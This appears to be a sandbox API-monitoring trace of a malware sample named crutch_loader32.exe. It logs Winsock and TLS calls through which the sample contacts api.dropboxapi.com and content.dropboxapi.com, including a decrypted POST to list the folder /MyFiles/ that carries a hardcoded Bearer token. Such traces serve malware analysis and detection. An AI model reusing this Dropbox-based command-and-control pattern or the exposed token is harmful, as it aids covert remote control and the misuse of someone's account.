+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f568
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f400
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2fc
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f2e0
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f400
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f2fc
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x19c
+[PAR] char   *buf   : 0x10f52d8
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10eced0
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10edf18
+[STR]                -> "api.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x2a6f5cc
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x2a6f5d8
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x14a
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x10f62e0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f5c0
+[PAR] unsigned long* pfContextAttr : 0x10edd00
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b67c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <QueryContextAttributesA> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] unsigned long  ulAttribute   : 0x4 (ISC_RET_REPLAY_DETECT)
+[PAR] void           *pBuffer      : 0x10edccc
+[RET] 0x748b6d17
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SealMessage> in [SspiCli.dll] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x10f40f0
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x2a6f558
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f564
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x10f7ba0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x184
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x00000000010F7BB5
+[STR]                   -> "POST /2/files/list_folder HTTP/1.1\r\nHost: api.dropboxapi.com\r\nAccept: */*\r\nAuthorization: Bearer 8vnhYs6XqfAAAAAAA"
+[STR]                      "AAAPF7FRK_XOi_5K6GVnFd82cWcBXzEKrfGoyRP8kPC25OR\r\nContent-Type: application/json\r\nContent-Length: 170\r\n\r\n{"path":"
+[STR]                      " "/MyFiles/","recursive": false,"include_media_info": false,"include_deleted": false,"include_has_explicit_shared_member"
+[STR]                      "s": false,"include_mounted_folders": true}"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x40
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x10f7d39
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x748b6e29
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f428
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f220
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f204
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f428
+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f220
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x19c
+[PAR] char   *buf : 0x10f7ba0
+[PAR] int    len  : 0x1d5
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f430
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f32c
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f360
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f348
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f360
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f464
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f568
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f430
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f32c
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f430
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f32c
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x19c
+[PAR] char   *buf   : 0x10fc458
+[PAR] int    len    : 0x4400
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext    : 0x10f40f0
+[PAR] PSecBufferDesc pMessage     : 0x2a6f590
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f59c
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x205
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x10fc458
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x748b7229
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f59c
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x10fc458
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x1ba
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x00000000010FC46D
+[STR]                   -> "HTTP/1.1 404 Not Found\r\nDate: Fri, 28 Feb 2025 02:12:43 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 281\r"
+[STR]                      "\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<"
+[STR]                      "title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n"
+[STR]                      "<hr>\n<address>Apache/2.4.41 (Ubuntu) Server at api.dropboxapi.com Port 443</address>\n</body></html>\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x36
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x10fc627
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ApplyControlToken> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext : 0x10f40f0
+[PAR] PSecBufferDesc pInput    : 0x2a6f6f8
+[RET] 0x748b77f0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10eced0
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10edf18
+[STR]                -> "api.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x10f40f0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f704
+[PAR] unsigned long* pfContextAttr : 0x10edd00
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b786b
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0xac0]
+
+[ * ] [pid 0xa5c][tid 0xac0] c:\users\user\desktop\crutch\crutch_loader32.exe
+[ i ] [ Thread is from a Worker Pool ]
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x19c
+[PAR] char   *buf : 0x10f8238
+[PAR] int    len  : 0x55
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x10f8238
+[RET] 0x748b78ab
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DeleteSecurityContext> in [SspiCli.dll] 
+[PAR] PCtxtHandle phContext : 0x10f40f0
+[RET] 0x748b7902
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x19c
+[RET] 0x748b2480
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeCredentialsHandle> in [SspiCli.dll] 
+[RET] 0x748b7716
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeLibrary> in [KERNEL32.DLL] 
+[RET] 0x748a15e0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSACleanup> in [WS2_32.dll] 
+[RET] 0x748a1229
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x9a8]
+
+[ * ] [pid 0xa5c][tid 0x9a8] c:\users\user\desktop\crutch\crutch_loader32.exe
+[ i ] [ Thread is from a Worker Pool ]
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <VerifyVersionInfoA> in [KERNEL32.DLL] 
+[RET] 0x748b3134
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetModuleHandleA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpModuleName : 0x74903bac ("kernel32")
+[RET] 0x748b31a0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x74903b9c ("LoadLibraryExA")
+[RET] 0x748b31b8
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x74903b88 ("AddDllDirectory")
+[RET] 0x748b3206
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x7490244c ("secur32.dll")
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x748b3214
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x4570000 ("secur32.dll")
+[PAR] LPCSTR  lpProcName : 0x74902434 ("InitSecurityInterfaceA")
+[RET] 0x748a15bc
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitSecurityInterfaceA> in [SspiCli.dll] 
+[RET] 0x748a15c2
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAStartup> in [WS2_32.dll] 
+[PAR] WORD wVersionRequested : 0x202
+[RET] 0x748a10e3
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WinHttpGetDefaultProxyConfiguration> in [WINHTTP.dll] 
+[RET] 0x748e5902
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WinHttpGetIEProxyConfigForCurrentUser> in [WINHTTP.dll] 
+[PAR] WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *pProxyConfig : 0x2a6f7b0
+[RET] 0x748e590c
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x748ebd66 
+[PAR] LPVOID                 lpParameter     : 0x10c9328
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x748ebc7a
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x954]
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x4 (0 sec)
+[RET] 0x748a1890
+
+[ * ] [pid 0xa5c][tid 0x954] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0x954] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getaddrinfo> in [WS2_32.dll] 
+[PAR] PCSTR      pNodeName    : 0x10ece30
+[STR]            -> "content.dropboxapi.com"
+[PAR] PCSTR      pServiceName : 0x46bf774
+[STR]            -> "443"
+[PAR] ADDRINFOA  *pHints      : 0x10ce520
+[PAR] PADDRINFOA *ppResult    : 0x46bf740
+[RET] 0x748b33ae
+
+[ * ] [pid 0xa5c][tid 0x954] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <freeaddrinfo> in [WS2_32.dll] 
+[PAR] PADDRINFO     pAddrInfo : 0x10e3c18
+[FLD] PADDRINFOW    pAddrInfo : 0x10e3c18
+[FLD]               -> ai_flags     = 0x0 
+[FLD]               -> ai_family    = 0x2 (AF_INET) (IPv4)
+[FLD]               -> ai_socktype  = 0x1 (SOCK_STREAM)
+[FLD]               -> ai_protocol  = 0x0 (NOT_SPECIFIED)
+[FLD]               -> ai_addrlen   = 0x10
+[FLD]               -> ai_canonname = 0x0 (null)
+[FLD]               -> *ai_addr     = 0x10e3958
+[FLD]               -> *ai_next     = 0x0
+[RET] 0x748b34e0
+
+[ * ] [pid 0xa5c][tid 0x954] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RtlExitUserThread> in [ntdll.dll] 
+[PAR] NTSTATUS ExitStatus : 0x0
+[RET] 0x748ebd0d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[RET] 0x748ea60b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x1ac
+[PAR] DWORD  dwMilliseconds : 0xffffffff (INFINITE)
+[RET] 0x748b4cc1
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x1ac
+[RET] 0x748b4cd1
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <socket> in [WS2_32.dll] 
+[PAR] int address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int type           : 0x1 (SOCK_STREAM)
+[PAR] int protocol       : 0x0 (NOT_SPECIFIED)
+[RET] 0x748b2555
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0xbb01
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x1ac
+[PAR] int    level   : 0x6 (IPPROTO_TCP)
+[PAR] int    optname : 0x1 (TCP_NODELAY)
+[PAR] char   *optval : 0x2a6f4b8
+[PAR] int    optlen  : 0x4
+[RET] 0x748b2276
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x2a6f4bc
+[FLD]        -> *argp = 0x1 (enable non-blocking mode)
+[RET] 0x748d3c82
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <connect> in [WS2_32.dll] 
+[PAR] SOCKET          s       : 0x1ac
+[PAR] struct sockaddr *name   : 0x2a6f510
+[FLD]          -> sin_family   : 2 (IPv4)
+[FLD]          -> sin_port     : 47873 (Little endian : 443)
+[FLD]          -> sin_addr     : 169.254.143.46
+[PAR] int             namelen : 0x10
+[RET] 0x748b28b4
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x780]
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAGetLastError> in [WS2_32.dll] 
+[RET] 0x748b28c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f4ac
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2a4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f288
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f4ac
+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2a4
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SleepEx> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x0 (0 sec)
+[RET] 0x748b1f4d
+
+[ * ] [pid 0xa5c][tid 0x780] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getsockopt> in [WS2_32.dll] 
+[PAR] SOCKET    s       : 0x1ac
+[PAR] int       level   : 0xffff
+[PAR] int       optname : 0x1007
+[PAR] char FAR* optval  : 0x2a6f5b8
+[PAR] int FAR*  optlen  : 0x2a6f5bc
+[RET] 0x748b1f6c
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getpeername> in [WS2_32.dll] 
+[PAR] SOCKET   s        : 0x1ac
+[PAR] sockaddr *name    : 0x2a6f538
+[PAR] int      *namelen : 0x2a6f4b0
+[RET] 0x748b2111
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getsockname> in [WS2_32.dll] 
+[PAR] SOCKET          s        : 0x1ac
+[PAR] struct sockaddr *name    : 0x2a6f4b8
+[PAR] int             *namelen : 0x2a6f4b0
+[RET] 0x748b215e
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0xbb01
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0x3004
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <VerifyVersionInfoA> in [KERNEL32.DLL] 
+[RET] 0x748b3134
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <AcquireCredentialsHandleA> in [SspiCli.dll] 
+[PAR] LPSTR          pszPrincipal     : 0x0 (null)
+[PAR] LPSTR          pszPackage       : 0x749057fc
+[STR]                -> "Microsoft Unified Security Protocol Provider"
+[PAR] unsigned long  fCredentialUse   : 0x2 (SECPKG_CRED_OUTBOUND)
+[PAR] void*          pvLogonId        : 0x0
+[PAR] void*          pAuthData        : 0x2a6f56c
+[FLD]                -> Type          = 4 (CredsspSchannelCreds)
+[FLD]                -> pSchannelCred = 0x0
+[FLD]                -> pSpnegoCred   = 0x0
+[PAR] SEC_GET_KEY_FN pGetKeyFn        : 0x0
+[PAR] void*          pvGetKeyArgument : 0x0
+[PAR] PCredHandle    phCredential     : 0x10ece50
+[PAR] PTimeStamp     ptsExpiry        : 0x10ece58
+[RET] 0x748b626f
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <AcquireCredentialsHandleA>
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10ece50
+[PAR] PCtxtHandle    phContext     : 0x0
+[PAR] CHAR*          pszTargetName : 0x10c9218
+[STR]                -> "content.dropboxapi.com"
